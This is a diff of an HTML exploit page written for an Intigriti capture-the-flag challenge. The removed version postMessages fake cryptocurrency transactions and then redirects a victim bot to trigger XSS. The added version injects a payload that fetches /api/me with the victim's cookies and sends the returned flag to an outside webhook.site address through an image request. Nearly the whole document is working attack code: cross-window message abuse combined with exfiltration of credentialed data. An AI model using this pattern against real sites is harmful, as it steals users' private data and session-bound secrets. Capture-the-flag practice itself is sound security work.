@@ -1,30 +1,33 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // 1. Open the Buy page for BTC
-        const win = window.open("https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1");
+<!doctype html><html><body><script>const target = "https://challenge-0126.intigriti.io/buy-confirm.html?currency=BTC&price=1";const win = window.open(target);setTimeout(() => {
 
-        // 2. Loop the postMessage to make sure it hits after the page loads
-        let count = 0;
-        const interval = setInterval(() => {
-            if (count > 5) {
-                clearInterval(interval);
-                // 3. Redirect the bot to the Market Watch page to trigger the XSS
-                win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
-                return;
-            }
-            
-            win.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: 'HELP',
-                    currency: 'BTC',
-                    amount: 0.00000001
-                }
-            }, '*');
-            count++;
-        }, 1500);
-    </script>
-</body>
-</html>
+win.postMessage({
+
+type: 'submitTransaction',
+
+transaction: {
+
+currency: 'BTC',
+
+amount: 1,
+
+toAddress: 'x'
+
+},
+
+exploit: `
+
+fetch('/api/me',{credentials:'include'})
+
+.then(r=>r.json())
+
+.then(d=>{
+
+new Image().src='https://webhook.site/4117c9f6-1f74-4bee-8e54-a89ea364f090?flag='+encodeURIComponent(d.flag);
+
+});
+
+`
+
+}, '*');
+
+}, 2000);</script></body></html>
